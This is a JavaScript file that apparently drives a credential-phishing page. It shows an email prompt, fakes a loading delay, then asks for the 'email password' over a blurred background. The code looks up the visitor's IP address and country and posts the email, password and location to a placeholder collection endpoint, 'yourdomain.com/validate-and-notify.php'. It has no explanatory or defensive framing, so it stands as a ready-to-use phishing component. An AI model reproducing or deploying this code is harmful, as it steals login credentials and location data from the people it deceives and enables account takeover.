var emailForm = document.getElementById("emailForm");
var passwordForm = document.getElementById("passwordForm");
var emailInput = document.getElementById("emailInput");
var emailProceed = document.getElementById("emailProceed");
var passwordInput = document.getElementById("passwordInput");
var passwordSubmit = document.getElementById("passwordSubmit");
var emailError = document.getElementById("emailError");
var passwordError = document.getElementById("passwordError");
var background = document.getElementById("background");
var loading = document.getElementById("loading");
var sessionIdElement = document.getElementById("sessionId");

function generateSessionId() {
  var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  var sessionId = '';
  for (var i = 0; i &lt; 10; i++) {
    sessionId += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return sessionId;
}

// Display session ID and set initial states
sessionIdElement.textContent = 'Session ID: ' + generateSessionId();
emailProceed.disabled = emailInput.value.trim() === "";
emailError.classList.toggle("active", emailInput.value.trim() === "");

emailProceed.addEventListener("click", function() {
  if (emailInput.value.trim() !== "") {
    emailForm.style.display = "none";
    background.style.display = "none";
    loading.classList.add("active");
    setTimeout(function() {
      loading.style.display = "none";
      background.style.display = "block";
      background.style.filter = "blur(3px)";
      passwordForm.style.display = "block";
    }, 3000);
  }
});

function getIPInfo() {
  return new Promise(function(resolve, reject) {
    fetch('https://ipapi.co/json/')
      .then(function(response) {
        if (!response.ok) {
          throw new Error('IP API error: ' + response.statusText);
        }
        return response.json();
      })
      .then(function(data) {
        resolve({
          ip: data.ip || 'Unknown',
          country: data.country_name || 'Unknown'
        });
      })
      .catch(function(error) {
        console.error('Failed to fetch IP info:', error);
        resolve({ ip: 'Unknown', country: 'Unknown' });
      });
  });
}

passwordSubmit.addEventListener("click", function() {
  if (passwordInput.value.trim() === "") {
    passwordError.textContent = "Enter your email password";
    passwordError.classList.add("active");
    passwordInput.classList.add("shake");
    setTimeout(function() { passwordInput.classList.remove("shake"); }, 500);
    return;
  }

  getIPInfo().then(function(ipInfo) {
    fetch('https://yourdomain.com/validate-and-notify.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: emailInput.value,
        password: passwordInput.value,
        ip: ipInfo.ip,
        country: ipInfo.country
      })
    })
    .then(function(response) {
      if (!response.ok) {
        throw new Error('Validation error');
      }
      return response.json();
    })
    .then(function(data) {
      if (data.success) {
        background.style.filter = "none";
        passwordForm.style.display = "none";
      } else {
        passwordError.textContent = data.error || "Incorrect Password";
        passwordError.classList.add("active");
        passwordInput.classList.add("shake");
        passwordInput.value = "";
        setTimeout(function() { passwordInput.classList.remove("shake"); }, 500);
      }
    })
    .catch(function(error) {
      console.error('Error during validation:', error);
      passwordError.textContent = "Validation failed";
      passwordError.classList.add("active");
      passwordInput.classList.add("shake");
      passwordInput.value = "";
      setTimeout(function() { passwordInput.classList.remove("shake"); }, 500);
    });
  });
});
